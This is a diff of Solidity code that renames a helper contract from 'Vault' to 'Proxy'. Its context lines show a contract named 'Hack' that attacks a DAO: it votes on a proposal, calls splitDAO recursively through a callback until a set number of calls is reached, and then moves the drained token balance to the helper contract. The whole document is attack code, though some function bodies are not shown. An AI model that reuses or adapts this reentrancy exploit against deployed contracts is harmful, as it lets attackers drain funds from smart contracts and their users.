@@ -1,10 +1,10 @@
 import "DAOInterface.sol";
 
-contract Vault {
+contract Proxy {
   DAOInterface DAO;
   address owner;
 
-  function Vault(address _dao) {
+  function Proxy(address _dao) {
     owner = msg.sender;
     DAO = DAOInterface(_dao);
   }
@@ -22,12 +22,12 @@ contract Hack {
   DAOInterface public DAO;
   uint public calls_to_make;
   uint public calls;
-  Vault public vault;
+  Proxy public proxy;
 
   function Hack(address _dao) {
     DAO = DAOInterface(_dao);
     calls = 0;
-    vault = new Vault(_dao);
+    proxy = new Proxy(_dao);
     calls_to_make = 1;
   }
 
@@ -42,9 +42,9 @@ contract Hack {
     DAO.vote(proposalID, true);
   }
 
-  function fillVault() {
+  function fillProxy() {
     uint balance = DAO.balanceOf(this);
-    DAO.transfer(address(vault), balance);
+    DAO.transfer(address(proxy), balance);
   }
 
   function splitDAO() {
@@ -55,7 +55,7 @@ contract Hack {
   function runHack(uint _calls_to_make) {
     calls = 0;
     calls_to_make = _calls_to_make;
-    vault.empty();
+    proxy.empty();
     splitDAO();
   }
 
@@ -63,7 +63,7 @@ contract Hack {
     if (calls < calls_to_make) {
       splitDAO();
     } else {
-      fillVault();
+      fillProxy();
     }
   }
 }
